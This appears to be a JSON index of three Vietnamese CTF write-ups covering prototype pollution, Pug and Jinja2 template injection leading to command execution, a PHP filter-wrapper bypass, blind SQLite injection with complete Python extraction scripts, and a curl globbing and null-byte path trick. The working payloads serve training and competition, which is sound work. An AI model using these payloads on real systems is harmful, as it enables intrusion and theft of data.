[
  
  {
    "title": "W1 Playground Writeup",
    "url": "/posts/W1Playground/",
    "categories": "CTF Writeup",
    "tags": "Prototype Pollution, SSTI, API testing",
    "date": "2024-02-27 23:00:00 +0700",
    





    
    "snippet": "Bài 1: easy loginPhân tích qua code thì chúng ta có 2 endpoint cần để tâm là “/login” và “/admin”Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng nhậpChức ...",
    "content": "Bài 1: easy loginPhân tích qua code thì chúng ta có 2 endpoint cần để tâm là “/login” và “/admin”Chức năng login bắt chúng ta post data lên và server sẽ trả lại mã jwtkey để chúng ta đăng nhậpChức năng admin kiểm tra xem chúng ta có phải admin không qua isAdmin=true sau khi phân tích jwtkeySau khi phân tích bài này dính lỗi Prototype Pollution bằng cách thêm logindata[\"__proto__\"][isAdmin]=true vào thì prototype của logindata sẽ có thuộc tính isAdmin=true từ đó logindata sẽ kế thừa thuộc tính đóPayloadCó jwtkey rồi thì vào admin để lấy flag thôiFlag : W1{REDACTED}Bài 2: render4freePhân tích qua code thì web này đang sử dụng Pug template engine để in ra các ký tự chúng ta gõ vàoSau khi phân tích code thì chúng ta có thể rút ra web đang dính lỗi SSTI nhưng có 1 function này đang chặn chúng ta khai thác SSTISau khi đọc pug document thì chúng ta có thể sử dụng “-“ để viết code jsBây giờ chúng ta có thể dùng “-“ để viết code js thì chúng ta viết gì ? Đó chính là ghi đè lại function filter ký tự của chúng ta- global.replace_bad_char = str_to_replace =&gt; str_to_replaceTiếp tục ghi đè lại function trên để chúng ta có thể thực hiện lệnh eval- global.replace_bad_char = str_to_replace =&gt; eval(str_to_replace)Sau khi ghi đè được rồi thì viết vào để thử thực hiện RCE nàoPayload require('child_process').exec('ping hacked.sv')Làm gì dễ thế anh Shin24 (author bài này) đã set type của nodejs là module tức chúng ta không thể require mà phải sử dụng importNhưng mà code đã chỉnh Promise.prototype.then đã thành 1 hàm trả về nullOat gì dark vậy, lúc này chúng ta sử dụng process.binding để import các modules của nodejs  process.binding('spawn_sync').spawn({     file: 'ls',    args: [''],    stdio: [        { type: 'pipe', readable: true, writable: false },        { type: 'pipe', readable: false, writable: true },        { type: 'pipe', readable: false, writable: true }  ]}).output.toString()Ngon vậy là có thể thực hiện lệnh lsĐể ý ở file Docker author đã tạo ra 1 file /read_flag để đọc flag vậy chúng ta thực thi file read_flag để nhận flagPayload:  process.binding('spawn_sync').spawn({     file: '/read_flag',    args: [''],    stdio: [        { type: 'pipe', readable: true, writable: false },        { type: 'pipe', readable: false, writable: true },        { type: 'pipe', readable: false, writable: true }  ]}).output.toString()Flag: W1{REDACTED}Bài 3: pwncloud"
  },
  
  {
    "title": "Wannagame Freshman CTF writeup",
    "url": "/posts/Wannagame-Freshman/",
    "categories": "CTF Writeup",
    "tags": "SQL Injectiom, SSTI",
    "date": "2023-11-11 23:00:00 +0700",
    





    
    "snippet": "WannaWinFreshman-WriteupBài 1 Warmup PHP:  Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file tron...",
    "content": "WannaWinFreshman-WriteupBài 1 Warmup PHP:  Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file trong server      Sau khi phân tích và tìm kiếm trên mạng thì mình tìm được 1 bài viếtLINK        Cơ bản là json_decode nó sẽ decode luôn mã unicode thành chữ cái vì vậy mình chỉnh lại cái payload của mình từ php://filter/convert.base64-encode/resource=/flagthành\\u0070hp://filter/convert.base64-encode/resource=/flag    Decode base64 và ra flag  Flag: W1{w3lc0m3_w3b_w4rrj0rs}    Bài 2 Namename:            Bài này cho 1 đường link và không cho thêm gì khác sau khi xem source của web này thì thấy có 1 đường dẫn là /wannaw1n    Sau khi đi tới đường dẫn /wannaw1n mình nhận ra ngay đây là SSTI jinja2  Payload : {{().__class__.__base__.__subclasses__()[279]('ls',shell=1,stdout=-1).communicate()}}      Và nó bị chặn                                 Sau vài thử nghiệm thì có vẽ nó chặn dấu . và [] nên mình chuyển qua          attr                      Payload mới: {{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")()|attr(\"__getitem__\")(279)('ls',shell=1,stdout=-1)|attr('communicate')()}}  Và nó đã hoạt động      Bây giờ sửa lại payload từ ls sang cat flag.txt    Và nó vẫn bị chặn cái gì đấy nên mình sử dụng cách này bypass filter (chổ này là chặn dấu . và chữ f thì phải)  {{()|attr(\"__class__\")|attr(\"__base__\")|attr(\"__subclasses__\")()|attr(\"__getitem__\")(279)('cat+*',shell=1,stdout=-1)|attr('communicate')()}}  Cách này sẽ đọc hết tất cả các file trong thư mục hiện tại và tìm được flag  Flag: W1{U_are_master_in_SSTI}    Bài 3 Solite:        Bài này mình khá tiếc vì mình đọc không kỉ filter nên mình không làm được  Tóm tắt đề thì bài này chỉ cho chúng ta cái page như thế này (blackbox)  Sau khi đọc code và được nghe 1 số gợi ý thì mình hiểu được đây là Blind SQL Injection      Nhìn kĩ source thì có 1 lỗ hổng cho chúng ta khai thác là substr không bị filter        Đây là query của bài    Sau một vài thử nghiệm thì mình tìm được cách để in ra tên của bảng  Payload: 1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),i,1) is 'a'--  Tóm tắt :  Payload này sau khi gửi lên server thì server sẽ thực hiện 1 query như sau SELECT * FROM API WHERE id LIKE '%1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--%'  select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%' sẽ trả về tên của tất cả các bảng  substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) sẽ lấy 1 ký tự a bắt đầu từ vị trí i  1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'-- cái này sẽ so sánh ký tự mà substr vừa cắt ra nếu chính xác thì sẽ thực hiện lệnh đằng trước là SELECT * FROM API WHERE id LIKE '%1' và trả về cột id=1 nếu sai thì nó không thực hiện và chẳng trả về gì cả  Đây là script mình tìm tên của bảngimport string,requestsfrom urllib.parse import quoteall_characters = string.ascii_letters + string.digits + \"!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}\"url = \"http://45.122.249.68:20020/search?name[]=\"payload=\"1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%'),1,1) is 'a'--\"table_name = \"\"haha = 0for i in range(1,10000):    for ps in all_characters:        payload =\"1' and substr((select group_concat(tbl_name) FROM sqlite_master WHERE type is 'table' and tbl_name NOT like 'sqlite_%%'),%d,1) is '%c'--\" %(i,ps)        payload =  quote(payload)        urlx = url + payload        #print(urlx)        r=requests.get(url=urlx)        if \"id\" in r.text:            table_name += ps            print(\"Table names: \",table_name)            haha +=1    if haha &lt; i:        breakprint(\"Success all the names of the tables are:\",table_name)  Và tìm ra được tên của các bảng làTables: API,flag_c1abd148_acae_40be_a953_eae333f90da0  Bây giờ dựa vào cái trên lấy ra flag từ bảng flag_c1abd148_acae_40be_a953_eae333f90da0 thôi  Script của mìnhimport string,requestsfrom urllib.parse import quoteall_characters = string.ascii_letters + string.digits + \"!#$%&amp;()+,-/:&lt;=&gt;?@[]^_{}\"url = \"http://45.122.249.68:20020/search?name[]=\"table_name = \"flag_c1abd148_acae_40be_a953_eae333f90da0\"#payload = \"1' and substr((select flag from flag_c1abd148_acae_40be_a953_eae333f90da0),1,1) is 'a'--\"haha = 0flag =\"\"for i in range(1,10000):    for ps in all_characters:        payload =\"1' and substr((select flag from %s),%d,1) is '%c'--\" %(table_name,i,ps)        payload =  quote(payload)        urlx = url + payload        #print(urlx)        r=requests.get(url=urlx)        if \"id\" in r.text:            flag += ps            print(\"Flag is: \",flag)            haha +=1    if haha &lt; i:        breakprint(\"Here is your flag:\",flag)  Flag: W1{I_th1nk_u_r_so_lite^_^}    Bài 4 Differences:        Flag ngay ở trong file  Flag: W1{SaKur4_s0_b34uTiFuL_RI9ht?????}    Bài 5 Free Flag:        Đọc file pcapng ta tìm được source và keyimport base64BANNER = \"\"\" ___       __   ________  ________   ________   ________  ___       __     _____  ________      |\\  \\     |\\  \\|\\   __  \\|\\   ___  \\|\\   ___  \\|\\   __  \\|\\  \\     |\\  \\  / __  \\|\\   ___  \\    \\ \\  \\    \\ \\  \\ \\  \\|\\  \\ \\  \\\\\\ \\  \\ \\  \\\\\\ \\  \\ \\  \\|\\  \\ \\  \\    \\ \\  \\|\\/_|\\  \\ \\  \\\\\\ \\  \\    \\ \\  \\  __\\ \\  \\ \\   __  \\ \\  \\\\\\ \\  \\ \\  \\\\\\ \\  \\ \\   __  \\ \\  \\  __\\ \\  \\|/ \\ \\  \\ \\  \\\\\\ \\  \\    \\ \\  \\|\\__\\_\\  \\ \\  \\ \\  \\ \\  \\\\\\ \\  \\ \\  \\\\\\ \\  \\ \\  \\ \\  \\ \\  \\|\\__\\_\\  \\   \\ \\  \\ \\  \\\\\\ \\  \\    \\ \\____________\\ \\__\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\\\\\ \\__\\ \\__\\ \\__\\ \\____________\\   \\ \\__\\ \\__\\\\\\ \\__\\\\    \\|____________|\\|__|\\|__|\\|__| \\|__|\\|__| \\|__|\\|__|\\|__|\\|____________|    \\|__|\\|__| \\|__|\"\"\"KEY = bytes.fromhex('deadbeef')def encryptSecret(secret):    lst_byte = []    for i in range(len(secret)):        enc_byte = ord(secret[i]) ^ KEY[i % len(KEY)]        lst_byte.append(enc_byte.to_bytes(1, 'big'))        return base64.b64encode(b''.join([_ for _ in lst_byte])).decode()if __name__=='__main__':    print(BANNER)    secret = input(\"&gt; Please give me your secret: \")    print(\"\\n&gt; Here is your encrypted secret:\", encryptSecret(secret)  Decrypt lại ta sẽ có flagimport base64KEY = bytes.fromhex('deadbeef')def decryptSecret(encrypted_secret):    encrypted_bytes = base64.b64decode(encrypted_secret.encode())    decrypted_bytes = [encrypted_bytes[i] ^ KEY[i % len(KEY)] for i in range(len(encrypted_bytes))]    decrypted_text = ''.join([chr(byte) for byte in decrypted_bytes])    return decrypted_textsecret = \"iZzFsKme0oOdndOqgdnxsKmZ0KG/2o+hgdA=\"print(decryptSecret(secret))  Flag: W1{w3llC0mE_tO_w4nNaw1N}  Mấy bài còn lại mình chưa biết làm do dark quá"
  },
  
  {
    "title": "Asis CTF 2023 Writeup",
    "url": "/posts/AsisCTF/",
    "categories": "CTF Writeup",
    "tags": "",
    "date": "2023-09-24 23:00:00 +0700",
    





    
    "snippet": "Asis-CTF-2023-WriteupBài 1 hello:  Tóm tắt đề thì đại khái là đề bảo chúng ta phải request một cái method get có parameter là x lên Web sao cho không có chữ next và chữ file là được, nhưng mà muốn ...",
    "content": "Asis-CTF-2023-WriteupBài 1 hello:  Tóm tắt đề thì đại khái là đề bảo chúng ta phải request một cái method get có parameter là x lên Web sao cho không có chữ next và chữ file là được, nhưng mà muốn đọc được flag thì phải đọc được file next.txt  Đọc đề, đề gợi ý cho mình đọc manpage của curl  Sau khi đọc và phân tích manpage mình đã nhận ra cách làm của bài này dựa vào chức năng bên dưới  Đây là payload của mình ?x=f[a-i]le:///ne[b-x]t.txt  Khi bypass được đoạn đầu tiên nó sẽ hiện ra 1 đường dẫn mới  Theo đường dẫn, đi tới đoạn thứ 2  Decode Base64 ra để lấy nội dung  Chắc chắn /app/index.js là source nên mình đã đọc nó  Decode tiếp thì ra source code  Code này đại khái là cũng như cái đầu bắt mình đọc file /next.txt nhưng lại cấm chữ next  Sau khi phân tích code nhận ra lỗi ở 2 chổ này  path.basename(fpath) sẽ trả lại cái tên file về cho mình còn fs.readFileSync(fpath) sẽ đọc file của fpath  Sau một số thử nghiệm thì đây là payload cuối cùng của mình /next.txt%00/yuu.txt  Decode  Decode  Flag: ASIS{good_job_bun}"
  }
  
]

